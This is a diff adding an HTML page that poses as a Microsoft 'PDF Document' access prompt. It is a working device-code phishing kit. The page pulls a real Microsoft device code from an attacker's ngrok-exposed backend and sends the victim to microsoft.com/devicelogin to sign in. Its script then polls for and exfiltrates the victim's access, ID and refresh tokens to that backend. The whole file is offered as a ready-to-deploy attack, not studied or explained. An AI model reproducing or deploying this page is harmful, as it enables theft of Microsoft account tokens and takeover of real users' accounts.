@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Microsoft Device Code Flow · Real Microsoft Codes</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000000;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .container {
+            max-width: 95%;
+            width: 100%;
+            max-width: 650px;
+            background: #fffef7;
+            border-radius: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            border: 1px solid #333;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: #f5f0e6;
+            padding: 1.5rem 1rem;
+            color: #4a3b2c;
+            text-align: center;
+            border-bottom: 1px solid #e5dccc;
+        }
+
+        .ms-logo {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .ms-logo div {
+            width: 40px;
+            height: 40px;
+            border-radius: 6px;
+        }
+
+        .blue { background: #00a4ef; }
+        .green { background: #7fba00; }
+        .yellow { background: #ffb900; }
+        .red { background: #f25022; }
+
+        .header h2 {
+            font-size: 1.5rem;
+            margin-bottom: 0.25rem;
+            font-weight: 500;
+            letter-spacing: -0.2px;
+            color: #ff0000;
+            word-break: break-word;
+        }
+
+        .header p {
+            font-size: 0.8rem;
+            opacity: 0.7;
+            color: #6b5a48;
+        }
+
+        .content {
+            padding: 1.5rem;
+        }
+
+        .code-box {
+            background: #fefaf0;
+            border: 2px solid #e2d5bd;
+            border-radius: 24px;
+            padding: 1.2rem;
+            text-align: center;
+            margin: 1rem 0 1.5rem 0;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.02), 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .code-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #9b8a6e;
+            font-weight: 600;
+        }
+
+        .code-value {
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: 4px;
+            color: #3e5a7c;
+            background: white;
+            padding: 0.5rem 0.8rem;
+            border-radius: 16px;
+            display: inline-block;
+            margin: 0.8rem 0;
+            border: 1px solid #e8ddc8;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.02);
+            cursor: pointer;
+            user-select: all;
+            word-break: break-all;
+            max-width: 100%;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+
+        @media (max-width: 480px) {
+            .code-value {
+                font-size: 1.2rem;
+                letter-spacing: 2px;
+                padding: 0.4rem 0.6rem;
+            }
+        }
+
+        .code-instructions {
+            font-size: 0.8rem;
+            color: #b29a6e;
+            margin-top: 0.5rem;
+        }
+
+        .instruction-steps {
+            background: #fefcf7;
+            border-radius: 20px;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            border: 1px solid #ece2d4;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0.75rem 0;
+            border-bottom: 0.5px solid #efe6db;
+            flex-wrap: wrap;
+        }
+
+        .step:last-child {
+            border-bottom: none;
+        }
+
+        .step-number {
+            background: #cbbd9f;
+            color: #2e2a24;
+            width: 28px;
+            height: 28px;
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .step-link {
+            color: #2b5797;
+            text-decoration: none;
+            font-weight: bold;
+            word-break: break-word;
+        }
+
+        .step-link:hover {
+            text-decoration: underline;
+        }
+
+        .status-area {
+            background: #f7f3ea;
+            border-radius: 16px;
+            padding: 1rem;
+            margin: 1rem 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.85rem;
+            border: 1px solid #e6ddcf;
+            flex-wrap: wrap;
+        }
+
+        .spinner {
+            width: 22px;
+            height: 22px;
+            border: 3px solid #e2d5c4;
+            border-top-color: #7f6b4f;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-status {
+            background: #eef5e8;
+            color: #3f6842;
+            border-left: 4px solid #7fba00;
+        }
+
+        .error-status {
+            background: #fef1ef;
+            color: #b1624b;
+            border-left: 4px solid #f25022;
+        }
+
+        .refresh-btn {
+            background: transparent;
+            border: 1px solid #b9aa8c;
+            color: #6b5a48;
+            padding: 0.5rem 1rem;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            font-weight: 500;
+            margin-top: 0.5rem;
+            transition: all 0.2s;
+            width: 100%;
+            max-width: 200px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .refresh-btn:hover {
+            background: #e8dfd0;
+            border-color: #9b8a6e;
+            color: #4a3b2c;
+        }
+
+        footer {
+            background: #fefcf8;
+            padding: 1rem;
+            text-align: center;
+            font-size: 0.65rem;
+            color: #b7a988;
+            border-top: 1px solid #ede5d9;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="ms-logo">
+            <div class="blue"></div>
+            <div class="green"></div>
+            <div class="yellow"></div>
+            <div class="red"></div>
+        </div>
+        <h2>PDF Document</h2>
+        <p>Enter this code to access document</p>
+    </div>
+
+    <div class="content">
+        <!-- Code Box - displays REAL Microsoft user_code -->
+        <div class="code-box">
+            <div class="code-label">📱 YOUR PDF ACCESS CODE</div>
+            <div class="code-value" id="userCodeDisplay" onclick="copyCode()">------</div>
+            <div class="code-instructions">
+                Click the code to copy
+            </div>
+        </div>
+
+        <!-- Instructions -->
+        <div class="instruction-steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div>Copy the code above</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div>Click continue and paste (Ctrl+V)</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div>Sign in with your Microsoft account</div>
+            </div>
+            <div class="step">
+                <div class="step-number">→</div>
+                <div><a href="https://microsoft.com/devicelogin" target="_blank" class="step-link">Continue to Microsoft</a></div>
+            </div>
+        </div>
+
+        <!-- Status Area -->
+        <div id="statusArea" class="status-area">
+            <div class="spinner"></div>
+            <span id="statusText">Waiting for code...</span>
+        </div>
+
+        <button id="refreshBtn" class="refresh-btn">⟳ Generate New Code</button>
+    </div>
+
+    <footer>
+        
+    </footer>
+</div>
+
+<script>
+// ============================================================
+// CLEAN HTML - NO SECRETS HERE!
+// All sensitive data (CLIENT_ID, SCOPES, Microsoft API URLs)
+// are stored on your backend RDP server, not in this HTML.
+// ============================================================
+
+// ============================================================
+// BACKEND CONFIGURATION - REPLACE WITH YOUR BACKEND URL
+// ============================================================
+// Run server.js on your RDP and use ngrok to expose it:
+// Example: https://abc123.ngrok.io
+const BACKEND_URL = "https://lorri-global-elanor.ngrok-free.dev";  // <-- CHANGED TO YOUR NGROK URL
+
+// DOM elements
+const userCodeDisplay = document.getElementById('userCodeDisplay');
+const codeRefText = document.getElementById('codeRefText');
+const statusArea = document.getElementById('statusArea');
+const statusText = document.getElementById('statusText');
+const refreshBtn = document.getElementById('refreshBtn');
+
+let currentInterval = null;
+let currentDeviceCode = null;
+let tokenSentToBackend = false;
+
+// Copy code function
+function copyCode() {
+    const code = userCodeDisplay.textContent;
+    if (code && code !== 'Error' && code !== '------') {
+        navigator.clipboard.writeText(code).then(() => {
+            const originalText = userCodeDisplay.style.opacity;
+            userCodeDisplay.style.opacity = '0.5';
+            setTimeout(() => {
+                userCodeDisplay.style.opacity = '1';
+            }, 200);
+        }).catch(() => {});
+    }
+}
+
+// Update status UI
+function setStatus(statusType, message) {
+    if (statusType === 'loading') {
+        statusArea.className = 'status-area';
+        statusArea.innerHTML = `<div class="spinner"></div><span>${message}</span>`;
+    } else if (statusType === 'success') {
+        statusArea.className = 'status-area success-status';
+        statusArea.innerHTML = `<span>✅ ${message}</span>`;
+    } else if (statusType === 'error') {
+        statusArea.className = 'status-area error-status';
+        statusArea.innerHTML = `<span>❌ ${message}</span>`;
+    } else {
+        statusArea.className = 'status-area';
+        statusArea.innerHTML = `<span>${message}</span>`;
+    }
+    statusText = message;
+}
+
+// Send token to backend
+async function sendTokenToBackend(tokenData) {
+    if (tokenSentToBackend) {
+        return true;
+    }
+    
+    try {
+        const response = await fetch(`${BACKEND_URL}/api/microsoft-token`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                access_token: tokenData.access_token,
+                id_token: tokenData.id_token,
+                refresh_token: tokenData.refresh_token || null,
+                expires_in: tokenData.expires_in,
+                token_type: tokenData.token_type,
+                scope: tokenData.scope,
+                user_code: currentUserCode || null,
+                captured_at: new Date().toISOString()
+            })
+        });
+        
+        if (response.ok) {
+            tokenSentToBackend = true;
+            return true;
+        } else {
+            return false;
+        }
+    } catch (error) {
+        return false;
+    }
+}
+
+let currentUserCode = null;
+
+// Poll for token after user completes sign-in
+async function pollForToken(deviceCode, intervalSeconds) {
+    if (currentInterval) {
+        clearInterval(currentInterval);
+    }
+    
+    let attempts = 0;
+    const maxAttempts = 30; // 30 * interval (usually 15 seconds = 7.5 minutes)
+    
+    currentInterval = setInterval(async () => {
+        attempts++;
+        
+        try {
+            const response = await fetch(`${BACKEND_URL}/api/poll-token`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_code: deviceCode })
+            });
+            
+            const data = await response.json();
+            
+            if (data.success && data.token) {
+                // Success! User signed in - CAPTURE TOKEN AND SEND TO BACKEND
+                const tokenData = {
+                    access_token: data.token.access_token,
+                    id_token: data.token.id_token,
+                    refresh_token: data.token.refresh_token,
+                    expires_in: data.token.expires_in,
+                    token_type: data.token.token_type,
+                    scope: data.token.scope
+                };
+                
+                // SEND TOKEN TO BACKEND
+                await sendTokenToBackend(tokenData);
+                
+                setStatus('success', 'Sign-in successful! Token sent to backend.');
+                
+                if (currentInterval) {
+                    clearInterval(currentInterval);
+                    currentInterval = null;
+                }
+                
+            } else if (data.status === 'pending') {
+                // Still waiting for user to sign in - no log
+                
+            } else if (data.status === 'expired') {
+                setStatus('error', 'Code expired. Click "Generate New Code".');
+                if (currentInterval) {
+                    clearInterval(currentInterval);
+                    currentInterval = null;
+                }
+                
+            } else {
+                // Unexpected response - silent
+            }
+            
+        } catch (error) {
+            // Silent error handling
+        }
+        
+        if (attempts >= maxAttempts) {
+            setStatus('error', 'Code expired — generate a new one');
+            if (currentInterval) {
+                clearInterval(currentInterval);
+                currentInterval = null;
+            }
+        }
+    }, intervalSeconds * 1000);
+}
+
+// Call backend to get device code
+async function generateMicrosoftDeviceCode() {
+    setStatus('loading', 'Generating code...');
+    
+    // Reset token sent flag
+    tokenSentToBackend = false;
+    
+    try {
+        const response = await fetch(`${BACKEND_URL}/api/device-code`);
+        const data = await response.json();
+        
+        if (data.success && data.user_code && data.device_code) {
+            // Success! Backend returned real codes
+            const userCode = data.user_code;
+            const deviceCode = data.device_code;
+            const interval = data.interval || 5;
+            
+            currentUserCode = userCode;
+            
+            // Display the REAL Microsoft user code
+            userCodeDisplay.textContent = userCode;
+            if (codeRefText) codeRefText.textContent = userCode;
+            
+            setStatus('loading', `Code ready! Enter ${userCode} at microsoft.com/devicelogin`);
+            
+            // Start polling for sign-in completion
+            if (currentInterval) {
+                clearInterval(currentInterval);
+            }
+            pollForToken(deviceCode, interval);
+            
+            return { userCode, deviceCode };
+            
+        } else {
+            // Error from backend
+            setStatus('error', `API Error: ${data.error || 'Unknown error'}`);
+            userCodeDisplay.textContent = 'Error';
+            if (codeRefText) codeRefText.textContent = 'Error';
+            return null;
+        }
+        
+    } catch (error) {
+        setStatus('error', `Network error: ${error.message}`);
+        userCodeDisplay.textContent = 'Error';
+        if (codeRefText) codeRefText.textContent = 'Error';
+        return null;
+    }
+}
+
+// Refresh button handler
+refreshBtn.addEventListener('click', async () => {
+    if (currentInterval) {
+        clearInterval(currentInterval);
+        currentInterval = null;
+    }
+    await generateMicrosoftDeviceCode();
+});
+
+// Auto-generate on page load
+(async function init() {
+    await generateMicrosoftDeviceCode();
+})();
+</script>
+</body>
+</html>
